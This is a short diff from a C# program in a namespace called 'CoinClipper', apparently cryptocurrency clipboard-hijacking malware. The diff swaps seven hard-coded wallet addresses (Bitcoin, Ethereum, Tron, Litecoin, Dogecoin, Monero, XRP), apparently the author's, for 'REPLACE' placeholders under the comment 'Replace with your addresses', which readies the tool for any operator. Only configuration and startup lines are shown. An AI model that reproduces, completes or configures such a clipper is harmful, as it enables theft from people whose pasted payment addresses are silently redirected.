@@ -39,13 +39,13 @@ namespace CoinClipper
         public static void Run()
         {
             // Replace with your addresses..
-            string btcReplacement = "bc1qu2cz83zjfnnzm5m06vf78ka2mcy5dxy3c2rrjk";
-            string ethReplacement = "0x17049D73D7C2D167F474742702c022dab8AA276a";
-            string trcReplacement = "TYa6hbouPRdMG7GyHBng6tgPFwTgiiokiV";
-            string ltcReplacement = "LhVW9ehS1r5c5X7H3SSNq2qKNAqAdXZeT8"; 
-            string dogeReplacement = "DPaVBdUVbyvPaY6pfvGcEenfcqfiaEYWb2"; 
-            string xmrReplacement = "47G48PYCUhxWi3yKqVqdRkPYhJwYvUpuKanY29KU6JwLDiEMWLAayWoP2JCJNnh9Ce9E8TcbnhopRDwr9HkAv9u16yM4Aud"; 
-            string xrpReplacement = "r4A8u5nBED6sf4N44Tz9RvzoAm9h2KeqCh"; 
+            string btcReplacement = "REPLACE";
+            string ethReplacement = "REPLACE";
+            string trcReplacement = "REPLACE";
+            string ltcReplacement = "REPLACE"; 
+            string dogeReplacement = "REPLACE"; 
+            string xmrReplacement = "REPLACE"; 
+            string xrpReplacement = "REPLACE"; 
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
